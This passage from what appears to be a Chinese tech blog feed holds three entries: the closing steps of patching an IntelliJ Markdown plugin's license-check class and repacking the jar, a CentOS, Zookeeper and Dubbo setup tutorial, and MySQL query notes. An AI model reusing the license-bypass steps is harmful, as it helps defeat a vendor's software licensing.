项目目录<span class="token comment"># 将修改后的 LicenseAgent.class 文件拷贝到解压后的 jar 包中</span><span class="token function">cp</span> out/production/multimarkdown/com/vladsch/idea/multimarkdown/license/LicenseAgent.class ./releases/2.7.0/source/com/vladsch/idea/multimarkdown/license/<span class="token comment"># 重新打包并移到上层目录</span><span class="token builtin class-name">cd</span> releases/2.7.0/source <span class="token operator">&amp;&amp;</span> jar cvf idea-multimarkdown.jar * <span class="token operator">&amp;&amp;</span> <span class="token function">mv</span> idea-multimarkdown.jar <span class="token punctuation">..</span>/<span class="token comment"># 将打好的包拷贝到 IDEA 插件目录中覆盖掉原文件</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token function">cp</span> idea-multimarkdown.jar ~/Library/Application<span class="token punctuation">\</span> Support/IntelliJIdea2018.x/idea-multimarkdown/lib/idea-multimarkdown.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成以上步骤后重启 idea 即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jetbrains.com/help/idea/2017.1/directories-used-by-intellij-idea-to-store-settings-caches-plugins-and-logs.html">JetBrains 官方文档中介绍的各个系统下的 IDEA 路径（配置路径、缓存路径、插件路径和日志路径）</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> 插件 </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM 虚拟机(CentOS)搭建 Dubbo、Zookeeper 分布式环境</title>
      <link href="/2018/11/11/buildingdistributedenvironment/"/>
      <url>/2018/11/11/buildingdistributedenvironment/</url>
      
        <content type="html"><![CDATA[<p>本文记录了我从 VM 安装 CentOS 7 开始到完成 Dubbo 2.6.5 管控台的安装。</p><span id="more"></span><h2 id="VM-安装-CentOS-7-6"><a href="#VM-安装-CentOS-7-6" class="headerlink" title="VM 安装 CentOS 7.6"></a>VM 安装 CentOS 7.6</h2><p>作为服务器用，所以不需要安装图形界面：<a href="https://blog.csdn.net/qq_18297675/article/details/52563819">安装 CentOS 7 字符界面</a></p><p><a href="https://www.linuxidc.com/Linux/2017-06/144401.htm">设置虚拟机静态 ip</a></p><h2 id="运行环境及工具"><a href="#运行环境及工具" class="headerlink" title="运行环境及工具"></a>运行环境及工具</h2><h3 id="JDK-1-8"><a href="#JDK-1-8" class="headerlink" title="JDK-1.8"></a><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">JDK-1.8</a></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将下载好的 JDK 传到服务器上(scp 命令)，解压</span><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> jdk-8u191-linux-x64.tar.gz<span class="token comment"># 添加环境变量</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/local/jdk1.8.0_191<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token comment"># 检验是否成功</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Maven-3-6"><a href="#Maven-3-6" class="headerlink" title="Maven-3.6"></a><a href="http://maven.apache.org/download.cgi">Maven-3.6</a></h3><pre class="line-numbers language-none"><code class="language-none"># 下载wget -c http://mirrors.hust.edu.cn/apache/maven/maven-3/3.6.0/binaries/apache-maven-3.6.0-bin.tar.gz# 解压tar zxvf apache-maven-3.6.0-bin.tar.gz# 添加环境变量vim /etc/profile环境变量中添加如下内容export M2_HOME=~/apache-maven-3.6.0export MAVEN_OPTS=-Xms256mexport PATH=$PATH:$M2_HOME/bin# 生效source /etc/profile# 查看 mvn 版本mvn -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>默认居然安装的是 1.8 的，算了，只是为了下源码而已…用户都不用设置了…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tomcat-7-0-92"><a href="#Tomcat-7-0-92" class="headerlink" title="Tomcat-7.0.92"></a><a href="https://tomcat.apache.org/download-70.cgi">Tomcat-7.0.92</a></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载最新版 Tomcat 7</span><span class="token function">wget</span> <span class="token parameter variable">-c</span> http://mirror.bit.edu.cn/apache/tomcat/tomcat-7/v7.0.92/bin/apache-tomcat-7.0.92.tar.gz<span class="token comment"># 解压 Tomcat</span><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> apache-tomcat-7.0.57.tar.gz<span class="token comment"># 重命名为 dubbo-admin-tomcat</span><span class="token function">mv</span> apache-tomcat-7.0.57 dubbo-admin-tomcat<span class="token comment"># 移除 Tomcat webapps 目录下的所有文件</span><span class="token builtin class-name">cd</span> dubbo-admin-tomcat/webapps<span class="token function">rm</span> <span class="token parameter variable">-rf</span> * <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">screen</span><span class="token comment"># 创建会话</span><span class="token function">screen</span><span class="token function">screen</span> <span class="token parameter variable">-S</span> dubbo<span class="token comment"># 暂时离开会话 Ctrl+a d</span><span class="token comment"># 查看已开启的会话</span><span class="token function">screen</span> <span class="token parameter variable">-ls</span><span class="token comment"># 连接现有会话</span><span class="token function">screen</span> <span class="token parameter variable">-r</span> <span class="token number">3528</span><span class="token function">screen</span> <span class="token parameter variable">-r</span> dubbo<span class="token comment"># 关闭对话</span><span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装-Zookeeper"><a href="#安装-Zookeeper" class="headerlink" title="安装 Zookeeper"></a>安装 Zookeeper</h2><p><a href="http://zookeeper.apache.org/">官网</a> <a href="http://mirrors.hust.edu.cn/apache/Zookeeper/">下载地址</a></p><h3 id="1-下载解压-Zookeeper"><a href="#1-下载解压-Zookeeper" class="headerlink" title="1.下载解压 Zookeeper"></a>1.下载解压 Zookeeper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-c</span> http://mirrors.hust.edu.cn/apache/Zookeeper/Zookeeper-3.4.13/Zookeeper-3.4.13.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> Zookeeper-3.4.13.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-创建数据和日志文件夹"><a href="#2-创建数据和日志文件夹" class="headerlink" title="2.创建数据和日志文件夹"></a>2.创建数据和日志文件夹</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Zookeeper-3.4.13<span class="token function">mkdir</span> data<span class="token function">mkdir</span> logs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-修改配置"><a href="#3-修改配置" class="headerlink" title="3.修改配置"></a>3.修改配置</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 拷贝一份 zoo_sample.cfg，命名为 zoo.cfg</span><span class="token builtin class-name">cd</span> conf<span class="token function">cp</span> zoo_sample.cfg zoo.cfg<span class="token comment"># 修改 zoo.cfg 配置文件</span><span class="token function">vi</span> zoo.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改/添加数据/日志路径</p><pre class="line-numbers language-cfg" data-language="cfg"><code class="language-cfg">dataDir=/usr/local/Zookeeper/datadataLogDir=/usr/local/Zookeeper/logs# 配置服务器，下面的 ip 也可以用 hosts 别名 Zookeeper-01server.1=192.168.2.156:2888:3888server.2=192.168.2.157:2888:3888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-创建-myid-文件"><a href="#4-创建-myid-文件" class="headerlink" title="4.创建 myid 文件"></a>4.创建 myid 文件</h3><p>在前面创建的 data 目录下创建 myid 并写入对应的 ip 的机器的编号（上面的 server.1）中的 1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> myid<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>[参数说明](#Zookeeper%20 参数说明)</p></blockquote><h3 id="5-配置环境变量"><a href="#5-配置环境变量" class="headerlink" title="5.配置环境变量"></a>5.配置环境变量</h3><p>在 <code>/etc/profile</code> 中添加环境变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Zookeeper env</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">Zookeeper_HOME</span><span class="token operator">=~</span>/Zookeeper-3.4.13<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$Zookeeper_HOME</span>/bin:<span class="token environment constant">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="启动-Zookeeper"><a href="#启动-Zookeeper" class="headerlink" title="启动 Zookeeper"></a>启动 Zookeeper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启动 Zookeeper 服务</span>zkServer.sh start<span class="token comment"># 查看状态</span>zkServer.sh status<span class="token comment"># 停止服务</span>zkServer.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># centOS 7 中 /etc/rc.d/rc.local 的权限被降低了，所以需要赋予执行权限</span><span class="token function">chmod</span> +x /etc/rc.d/rc.local<span class="token comment"># 编辑开机启动命令</span><span class="token function">vi</span> /etc/rc.local<span class="token comment"># 添加启动脚本</span><span class="token function">su</span> - root <span class="token parameter variable">-c</span> <span class="token string">'~/zookeeper-3.4.13/bin/zkServer.sh start'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装-Dubbo-管控台"><a href="#安装-Dubbo-管控台" class="headerlink" title="安装 Dubbo 管控台"></a>安装 Dubbo 管控台</h2><p>Dubbo 2.6.x 的 <code>dubbo-admin</code> 管理平台已经经过重构， 改成使用 spring boot 实现了，之前下载源码后使用 <code>mvn clean package -Dmaven.test.skip=true</code> 编译打包后会得到一个 war 包，将这个 war 包扔到 Tomcat 应用目录下，配置好 Zookeeper 后，启动 Tomcat 就安装成功了。而现在改成了 spring boot 实现之后，安装方式有很大不同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载源码</span><span class="token function">git</span> https://github.com/apache/incubator-dubbo-ops.git<span class="token comment"># 进入目录</span><span class="token builtin class-name">cd</span> incubator-dubbo-ops/<span class="token comment"># 查看分支</span><span class="token function">git</span> branch <span class="token parameter variable">-a</span><span class="token comment"># 切换为 master 分支</span><span class="token function">git</span> checkout <span class="token parameter variable">-b</span> master origin/master<span class="token comment"># 查看本地分支</span><span class="token function">git</span> branch<span class="token comment"># 进入 incubator-dubbo-ops 目录打包</span><span class="token comment"># PS：第一次时间较长，我用时 24 分钟</span>mvn clean package <span class="token parameter variable">-Dmaven.test.skip</span><span class="token operator">=</span>true<span class="token comment"># 进入 incubator-dubbo-ops/dubbo-admin 目录</span>mvn spring-boot:run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-开启上述端口"><a href="#6-开启上述端口" class="headerlink" title="6.开启上述端口"></a>6.开启上述端口</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 开启 Zookeeper 端口</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">8080</span>/tcp <span class="token parameter variable">--permanent</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">2181</span>/tcp <span class="token parameter variable">--permanent</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">2888</span>/tcp <span class="token parameter variable">--permanent</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">3888</span>/tcp <span class="token parameter variable">--permanent</span><span class="token comment"># 开启 Dubbo 管控台端口</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">7001</span>/tcp <span class="token parameter variable">--permanent</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">20880</span>/tcp <span class="token parameter variable">--permanent</span><span class="token comment"># 重新加载防火墙</span>firewall-cmd <span class="token parameter variable">--reload</span><span class="token comment"># 查看开启的端口</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --list-ports<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开 dubbo 管理控制台：<a href="http://localhost:7001/">http://localhost:7001/</a> </p><h2 id="Zookeeper-参数说明"><a href="#Zookeeper-参数说明" class="headerlink" title="Zookeeper 参数说明"></a>Zookeeper 参数说明</h2><p>|                       参数名                        |                                                                                                                                                                                               说明                                                                                                                                                                                               |</p><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">clientPort</td><td align="center">客户端连接 server 的端口，即对外服务端口，一般设置为 2181 吧</td></tr><tr><td align="center">tickTime</td><td align="center">Zookeeper 中的一个时间单元。Zookeeper 中所有时间都是以这个时间单元为基础，进行整数倍配置的。例如，session 的最小超时时间是 2*tickTime</td></tr><tr><td align="center">dataDir</td><td align="center">存储快照文件 snapshot 的目录。默认情况下，事务日志也会存储在这里。建议同时配置参数 dataLogDir, 事务日志的写性能直接影响 Zookeeper 性能</td></tr><tr><td align="center">dataLogDir</td><td align="center">事务日志输出目录。尽量给事务日志的输出配置单独的磁盘或是挂载点，这将极大的提升 Zookeeper 性能</td></tr><tr><td align="center">globalOutstandingLimit</td><td align="center">最大请求堆积数。默认是 1000。Zookeeper 运行的时候， 尽管 server 已经没有空闲来处理更多的客户端请求了，但是还是允许客户端将请求提交到服务器上来，以提高吞吐性能。当然，为了防止 Server 内存溢出，这个请求堆积数还是需要限制下的。(Java system property: Zookeeper.globalOutstandingLimit.)</td></tr><tr><td align="center">preAllocSize</td><td align="center">预先开辟磁盘空间，用于后续写入事务日志。默认是 64M，每个事务日志大小就是 64M。如果 Zookeeper 的快照频率较大的话，建议适当减小这个参数</td></tr><tr><td align="center">snapCount</td><td align="center">每进行 snapCount 次事务日志输出后，触发一次快照(snapshot), 此时，Zookeeper 会生成一个 snapshot. 文件，同时创建一个新的事务日志文件 log。默认是 100000.（真正的代码实现中，会进行一定的随机数处理，以避免所有服务器在同一时间进行快照而影响性能）(Java system property: Zookeeper.snapCount)</td></tr><tr><td align="center">traceFile</td><td align="center">用于记录所有请求的 log，一般调试过程中可以使用，但是生产环境不建议使用，会严重影响性能。(Java system property:? requestTraceFile)</td></tr><tr><td align="center">maxClientCnxns</td><td align="center">单个客户端与单台服务器之间的连接数的限制，是 ip 级别的，默认是 60，如果设置为 0，那么表明不作任何限制。请注意这个限制的使用范围，仅仅是单台客户端机器与单台 Zookeeper 服务器之间的连接数限制，不是针对指定客户端 IP，也不是 Zookeeper 集群的连接数限制，也不是单台 Zookeeper 对所有客户端的连接数限制。指定客户端 IP 的限制策略，这里有一个 patch，可以尝试一下：<a href="http://rdc.taobao.com/team/jm/archives/1334%EF%BC%88No">http://rdc.taobao.com/team/jm/archives/1334（No</a> Java system property）</td></tr><tr><td align="center">clientPortAddress</td><td align="center">对于多网卡的机器，可以为每个 IP 指定不同的监听端口。默认情况是所有 IP 都监听 clientPort 指定的端口。 New in 3.3.0</td></tr><tr><td align="center">minSessionTimeoutmaxSessionTimeout</td><td align="center">Session 超时时间限制，如果客户端设置的超时时间不在这个范围，那么会被强制设置为最大或最小时间。默认的 Session 超时时间是在 2 * tickTime ~ 20 * tickTime 这个范围 New in 3.3.0</td></tr><tr><td align="center">fsync.warningthresholdms</td><td align="center">事务日志输出时，如果调用 fsync 方法超过指定的超时时间，那么会在日志中输出警告信息。默认是 1000ms。(Java system property: fsync.warningthresholdms)New in 3.3.4</td></tr><tr><td align="center">autopurge.purgeInterval</td><td align="center">在上文中已经提到，3.4.0 及之后版本，Zookeeper 提供了自动清理事务日志和快照文件的功能，这个参数指定了清理频率，单位是小时，需要配置一个 1 或更大的整数，默认是 0，表示不开启自动清理功能。(No Java system property) New in 3.4.0</td></tr><tr><td align="center">autopurge.snapRetainCount</td><td align="center">这个参数和上面的参数搭配使用，这个参数指定了需要保留的文件数目。默认是保留 3 个。(No Java system property) New in 3.4.0</td></tr><tr><td align="center">electionAlg</td><td align="center">在之前的版本中， 这个参数配置是允许我们选择 leader 选举算法，但是由于在以后的版本中，只会留下一种 “TCP-based version of fast leader election” 算法，所以这个参数目前看来没有用了，这里也不详细展开说了。(No Java system property)</td></tr><tr><td align="center">initLimit</td><td align="center">Follower 在启动过程中，会从 Leader 同步所有最新数据，然后确定自己能够对外服务的起始状态。Leader 允许 F 在 initLimit 时间内完成这个工作。通常情况下，我们不用太在意这个参数的设置。如果 Zookeeper 集群的数据量确实很大了，F 在启动的时候，从 Leader 上同步数据的时间也会相应变长，因此在这种情况下，有必要适当调大这个参数了。(No Java system property)</td></tr><tr><td align="center">syncLimit</td><td align="center">在运行过程中，Leader 负责与 Zookeeper 集群中所有机器进行通信，例如通过一些心跳检测机制，来检测机器的存活状态。如果 L 发出心跳包在 syncLimit 之后，还没有从 F 那里收到响应，那么就认为这个 F 已经不在线了。注意：不要把这个参数设置得过大，否则可能会掩盖一些问题。(No Java system property)</td></tr><tr><td align="center">leaderServes</td><td align="center">默认情况下，Leader 是会接受客户端连接，并提供正常的读写服务。但是，如果你想让 Leader 专注于集群中机器的协调，那么可以将这个参数设置为 no，这样一来，会大大提高写操作的性能。(Java system property: Zookeeper. leaderServes)</td></tr><tr><td align="center">server.x=[hostname]:nnnnn[:nnnnn]</td><td align="center">这里的 x 是一个数字，与 myid 文件中的 id 是一致的。右边可以配置两个端口，第一个端口用于 F 和 L 之间的数据同步和其它通信，第二个端口用于 Leader 选举过程中投票通信。(No Java system property)</td></tr><tr><td align="center">group.x=nnnnn[:nnnnn]weight.x=nnnnn</td><td align="center">对机器分组和权重设置，可以 参见这里(No Java system property)</td></tr><tr><td align="center">cnxTimeout</td><td align="center">Leader 选举过程中，打开一次连接的超时时间，默认是 5s。(Java system property: Zookeeper. cnxTimeout)</td></tr><tr><td align="center">Zookeeper.DigestAuthenticationProvider.superDigest</td><td align="center">Zookeeper 权限设置相关，具体参见《使用 super 身份对有权限的节点进行操作 》和 《Zookeeper 权限控制》</td></tr><tr><td align="center">skipACL</td><td align="center">对所有客户端请求都不作 ACL 检查。如果之前节点上设置有权限限制，一旦服务器上打开这个开头，那么也将失效。(Java system property: Zookeeper.skipACL)</td></tr><tr><td align="center">forceSync</td><td align="center">这个参数确定了是否需要在事务日志提交的时候调用 FileChannel.force 来保证数据完全同步到磁盘。(Java system property: Zookeeper.forceSync)</td></tr><tr><td align="center">jute.maxbuffer</td><td align="center">每个节点最大数据量，是默认是 1M。这个限制必须在 server 和 client 端都进行设置才会生效。(Java system property: jute.maxbuffer)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微服务 </tag>
            
            <tag> Dubbo </tag>
            
            <tag> Zookeeper </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 常用 SQL</title>
      <link href="/2018/09/22/mysqlpracticalsql/"/>
      <url>/2018/09/22/mysqlpracticalsql/</url>
      
        <content type="html"><![CDATA[<p>记录一些不经常用但是需要的时候很有用的查询语句，不定期更新</p><span id="more"></span><h2 id="查询信息"><a href="#查询信息" class="headerlink" title="查询信息"></a>查询信息</h2><h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select database();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p>MySQL 中没有产生微秒的函数，now() 只能精确到秒，也没有存储带有毫秒、微秒的日期时间类型。但是却有提取微妙的函数…</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 显示当前时间戳(秒)select unix_timestamp(now());# 提取时间中的微秒 123456select microsecond('12:00:00.123456');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类型转换及字符串拼接"><a href="#类型转换及字符串拼接" class="headerlink" title="类型转换及字符串拼接"></a>类型转换及字符串拼接</h3><ul><li><p>类型转换：<code>CAST(value AS TYPE)</code></p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 数字转字符串cast(1 as char);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>字符串拼接：<code>CONCAT(str1, str2, str3...)</code></p></li></ul><p>示例：两个数字拼接成分数</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT CONCAT(CAST(1 AS CHAR), '/', CAST(2 AS CHAR)) AS RATIO FROM DUAL;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果：<img src="http://wx2.sinaimg.cn/large/a6e9cb00ly1fvez03wzojj204u028mxc.jpg"></p><h3 id="根据条件显示"><a href="#根据条件显示" class="headerlink" title="根据条件显示"></a>根据条件显示</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select if(condition, a, b);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果 <code>condition</code> 为 <code>true</code> 则返回 <code>a</code>, 否则返回 <code>b</code></li><li><code>if()</code> 返回一个数字或字符串值</li></ul><h3 id="判断空值"><a href="#判断空值" class="headerlink" title="判断空值"></a>判断空值</h3><ul><li><p>如果 <code>value1</code> 为空则返回 <code>value2</code>, 否则返回 <code>value1</code></p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ifnull(value1,value2);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果 <code>value1</code> 为空返回 <code>value2</code>，否则返回 <code>value3</code></p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">    select if(isnull(value1), value2, value3);### 重复记录- 删除重复记录: 根据 t 表中的 a, b 字段删除 t 表中多余的重复记录    ```mysql    delete from t where id not in (select id from        (select min(id) as id from t group by a, b) as c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>必须要有 <code>select id from (...) as C</code></p></blockquote></li><li><p>查找重复记录: 根据 t 表中的 a, b 字段查找 t 表中多余的重复记录(不包含 rowid 最小的记录)</p><ul><li><p>方法一：子查询 (较快)</p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from   (select a, b, count(a) as numa, count(b) as numb from t group by a, b) as ewhere numa &gt; 1 and numb &gt; 1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>方法二：<code>group by</code> 和 <code>having</code> (较慢)</p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from t group by a, b having count(a) &gt; 1 and count(b) &gt; 1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h3 id="同比上升的记录"><a href="#同比上升的记录" class="headerlink" title="同比上升的记录"></a>同比上升的记录</h3><p>从 <code>t</code> 表中查询所有与前 n 天相比，<code>a</code> 字段数据有所提高的数据。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select t_cur.* from    t t_cur, t t_old  where    to_days(t_cur.date) - to_days(t_old.date) = n  and t_cur.a &gt; t_old.a;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>date</code> 是日期</p></blockquote><p><a href="https://leetcode-cn.com/problems/rising-temperature/">例题：给定一个 <code>Weather</code> 表，编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 Id。</a></p><h3 id="交换相邻数据"><a href="#交换相邻数据" class="headerlink" title="交换相邻数据"></a>交换相邻数据</h3><ul><li><p>交换 <code>id</code> 为连续整数的 <code>t</code> 表中两条相邻数据的 <code>id</code></p><ul><li><p>方法一：自定义变量</p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select @num:=case  when t.id%2=1 and t.id=tmp.id then t.id  when t.id%2=1 then (t.id+1)  when t.id%2=0 then (t.id-1)  else 0 end id, t.otherfrom t,   (select max(id) id from t) tmporder by id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法二：<code>union</code></p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ((id + 1) div 2 * 2 - mod(id + 1, 2)) id, otherfrom twhere ((id + 1) div 2) * 2 &lt;= (select count(1) from t)unionselect *from twhere ((id + 1) div 2) * 2 &gt; (select count(1) from t)order by id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>交换指定字段的数据</p>  <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">    ```## 函数```mysqlCREATE FUNCTION 函数名(参数 参数数据类型) RETURNS 返回数据类型BEGIN# 自定义变量Declare 变量 数据类型;# 赋值Set 变量 = 参数 - 1;  RETURN (      # 查询语句，可以使用前面设置的变量或参数，但不能在此进行运算      select DISTINCT Salary from Employee order by Salary DESC limit 变量, 1  );END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><blockquote><p>在查询语句中不能直接写数学运算必须通过赋值来进行运算</p></blockquote><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="查询第-N-高的薪水"><a href="#查询第-N-高的薪水" class="headerlink" title="查询第 N 高的薪水"></a>查询第 N 高的薪水</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGINDeclare M INT;SET M = N - 1;  RETURN (      select distinct Salary from Employee order by Salary desc limit M, 1  );END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分数排名"><a href="#分数排名" class="headerlink" title="分数排名"></a>分数排名</h4><p>如果两个分数相同，则两个分数排名（Rank）相同。请注意，平分后的下一个名次应该是下一个连续的整数值。换句话说，名次之间不应该有 “间隔”。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select Score,       cast(case         when @prevRank = Score then @curRank         when @prevRank := Score then @curRank := @curRank + 1         else @curRank := @curRank + 1         end as signed) as Rankfrom (select Score from Scores order by Score desc) p,  (select @curRank :=0, @prevRank := null) r;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="limit-m-n-与-limit-m-offset-n-区别"><a href="#limit-m-n-与-limit-m-offset-n-区别" class="headerlink" title="limit m, n 与 limit m offset n 区别"></a><code>limit m, n</code> 与 <code>limit m offset n</code> 区别</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table limit m,n;                 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>limit m, n</code> 含义是跳过 m 条取出 n 条数据，limit 后面是从第 m 条开始读，读取 n 条信息，即从第 m + 1 条开始读取 n 条数据</p><pre class="line-numbers language-mysql" data-language="mysql"><code 